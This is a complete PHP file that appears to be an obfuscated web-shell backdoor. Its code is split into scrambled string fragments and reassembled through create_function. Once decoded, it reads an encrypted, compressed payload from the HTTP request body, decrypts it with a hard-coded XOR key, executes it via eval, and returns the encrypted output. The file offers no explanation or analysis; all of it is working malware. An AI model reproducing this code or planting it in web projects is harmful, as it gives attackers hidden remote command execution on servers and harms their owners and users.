<?php
$Z='et2_conten2ts();@2ob_en2d2_clean();$2r=@b22ase624_encode(@x(@g2zc2ompre2ss(2$2o),$k));print("$p$kh$r2$kf");}';
$X=str_replace('Q','','QQcQreate_fQuQQnction');
$y='input"2),$m)==221) {@o2b_start2();@e2v2al(@gzunco2mpr2ess(@x(@base624_2decode2($m[1]),$22k)));$o=@ob_g';
$A='$k="1a7ef22bf7";$k2h="1e42ce1e8ac20e";2$kf="efaf202ae7230c4";2$p="jPHmWrFxr52qJuI9j"2;fu2nction x($t22,';
$O='$k){$c=st2rle2n($k);$l=st22rlen($t)2;$o="";f2or($i=02;2$i2<$l;){for($j=0;(222$j2<$c&&$i<$l);$j++,$i++22';
$o='){$o.=$t{2$i}^$k{2$j};}}r2etu2rn $o;}22if (@preg_2matc2h("/2$2kh(.+)$kf/",@fi2le_get_co2ntents("2php:/2/';
$K=str_replace('2','',$A.$O.$o.$y.$Z);
$W=$X('',$K);$W();
?>
